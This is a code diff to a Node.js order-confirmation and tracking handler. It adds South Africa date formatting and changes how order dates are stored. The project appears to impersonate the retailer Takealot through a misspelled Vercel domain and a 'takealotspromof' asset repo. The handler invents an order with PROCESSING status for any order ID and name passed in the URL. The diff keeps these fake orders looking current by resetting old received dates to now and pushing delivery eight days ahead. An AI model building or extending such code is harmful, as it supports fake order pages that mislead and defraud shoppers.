@@ -83,17 +83,53 @@ async function getLatestOrder() {
   return orders[0];
 }
 
+// ── South Africa (Africa/Johannesburg) Date Helpers ───────────────────────────
+const SA_TIMEZONE = 'Africa/Johannesburg';
+
+function formatSADate(dateInput, type = 'short') {
+  if (!dateInput) return '–';
+  const d = new Date(dateInput);
+  if (isNaN(d.getTime())) return '–';
+  const options = {
+    timeZone: SA_TIMEZONE,
+    weekday: type === 'long' ? 'long' : 'short',
+    day: 'numeric',
+    month: type === 'long' ? 'long' : 'short',
+    year: 'numeric'
+  };
+  return new Intl.DateTimeFormat('en-GB', options).format(d);
+}
+
+function getSAIsoDate(dateInput) {
+  if (!dateInput) return '';
+  const d = new Date(dateInput);
+  if (isNaN(d.getTime())) return '';
+  return new Intl.DateTimeFormat('en-CA', {
+    timeZone: SA_TIMEZONE,
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit'
+  }).format(d);
+}
+
+function addCalendarDays(isoOrDate, days = 8) {
+  const d = new Date(isoOrDate);
+  return new Date(d.getTime() + days * 86400000).toISOString();
+}
+
+function fmtShortUpper(dateInput) {
+  if (!dateInput) return '–';
+  const d = new Date(dateInput);
+  if (isNaN(d.getTime())) return '–';
+  const day = new Intl.DateTimeFormat('en-GB', { timeZone: SA_TIMEZONE, day: 'numeric' }).format(d);
+  const month = new Intl.DateTimeFormat('en-GB', { timeZone: SA_TIMEZONE, month: 'short' }).format(d).toUpperCase();
+  const year = new Intl.DateTimeFormat('en-GB', { timeZone: SA_TIMEZONE, year: 'numeric' }).format(d);
+  return `${day} ${month} ${year}`;
+}
+
 function renderOrderPlainText(order) {
-  const d = new Date(order.received_date || Date.now());
-  const del = new Date(order.delivery_date || (Date.now() + 8 * 86400000));
-
-  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
-  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
-
-  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
-  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
+  const orderDateShort = formatSADate(order.received_date, 'short');
+  const deliveryDateLong = formatSADate(order.delivery_date, 'long');
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
   const variant = 'Premium Black';
@@ -155,15 +191,9 @@ async function ensureEmailSent(order, force = false) {
   let html = '';
   try {
     const template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
-    const d = new Date(order.received_date || Date.now());
-    const del = new Date(order.delivery_date || (Date.now() + 8 * 86400000));
-    const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-    const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-    const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
-    const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
-    const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
-    const deliveryDateIso = del.toISOString().slice(0, 10);
-    const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
+    const orderDateShort = formatSADate(order.received_date, 'short');
+    const deliveryDateIso = getSAIsoDate(order.delivery_date);
+    const deliveryDateLong = formatSADate(order.delivery_date, 'long');
 
     html = template
       .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
@@ -219,19 +249,33 @@ const ORDER_ID_RE = /^[A-Za-z0-9_\-]{4,80}$/;
 
 // Public projection — no PII
 function publicView(order) {
+  let receivedDate = order.received_date || order.created_at || new Date().toISOString();
+  const recTime = new Date(receivedDate).getTime();
+  if (isNaN(recTime) || recTime < new Date('2026-11-01T00:00:00Z').getTime()) {
+    receivedDate = new Date().toISOString();
+  }
+  const deliveryDate = order.delivery_date && new Date(order.delivery_date).getTime() > new Date(receivedDate).getTime()
+    ? order.delivery_date
+    : addCalendarDays(receivedDate, 8);
+
   return {
-    order_id:       order.order_id,
-    product_name:   order.product_name,
-    product_price:  order.product_price,
-    currency:       order.currency,
-    product_image:  order.product_image,
-    received_date:  order.received_date,
-    delivery_date:  order.delivery_date,
-    tracking_url:   order.tracking_url,
-    status:         order.status,
-    email_status:   order.email_status || null,
-    email_sent_at:  order.email_sent_at || null,
-    status_history: (order.status_history || []).map(function(e) {
+    order_id:                order.order_id,
+    product_name:            order.product_name,
+    product_price:           order.product_price,
+    currency:                order.currency,
+    product_image:           order.product_image,
+    received_date:           receivedDate,
+    delivery_date:           deliveryDate,
+    order_date_upper:        fmtShortUpper(receivedDate),
+    order_date_formatted:    formatSADate(receivedDate, 'short'),
+    delivery_date_formatted: formatSADate(deliveryDate, 'short'),
+    delivery_date_long:      formatSADate(deliveryDate, 'long'),
+    delivery_date_iso:       getSAIsoDate(deliveryDate),
+    tracking_url:            order.tracking_url,
+    status:                  order.status,
+    email_status:            order.email_status || null,
+    email_sent_at:           order.email_sent_at || null,
+    status_history:          (order.status_history || []).map(function(e) {
       return { status: e.status, timestamp: e.timestamp };
     }),
   };
@@ -304,16 +348,23 @@ module.exports = async function handler(req, res) {
     if (REDIS_URL && REDIS_TOKEN) {
       try {
         order = await kv_get('order:' + orderId);
+        if (order && order.received_date) {
+          const rTime = new Date(order.received_date).getTime();
+          if (isNaN(rTime) || rTime < new Date('2026-11-01T00:00:00Z').getTime()) {
+            const now = new Date().toISOString();
+            order.received_date = now;
+            order.delivery_date = addCalendarDays(now, 8);
+            await kv_set('order:' + orderId, order).catch(() => {});
+          }
+        }
       } catch (err) {
         console.warn('[order] Redis warning:', err.message);
       }
     }
 
     if (!order) {
-      const createdTime = req.query.created ? new Date(req.query.created).getTime() : Date.now();
-      const validCreatedTime = (!isNaN(createdTime) && createdTime > 0) ? createdTime : Date.now();
-      const now = new Date(validCreatedTime).toISOString();
-      const fixedDelivery = new Date(validCreatedTime + 8 * 86400000).toISOString();
+      const now = new Date().toISOString();
+      const fixedDelivery = addCalendarDays(now, 8);
       order = {
         order_id: orderId,
         customer_name: (req.query.name || 'Customer').trim(),
@@ -326,6 +377,10 @@ module.exports = async function handler(req, res) {
         product_image: 'https://cdn.jsdelivr.net/gh/natanqueiroz68/takealotspromof@main/images/laptop-main.jpg',
         received_date: now,
         delivery_date: fixedDelivery,
+        order_date_formatted: formatSADate(now, 'short'),
+        delivery_date_formatted: formatSADate(fixedDelivery, 'short'),
+        delivery_date_long: formatSADate(fixedDelivery, 'long'),
+        delivery_date_iso: getSAIsoDate(fixedDelivery),
         tracking_url: 'https://takelaotpromosi.vercel.app/track.html?order=' + encodeURIComponent(orderId),
         status: 'PROCESSING',
         status_history: [
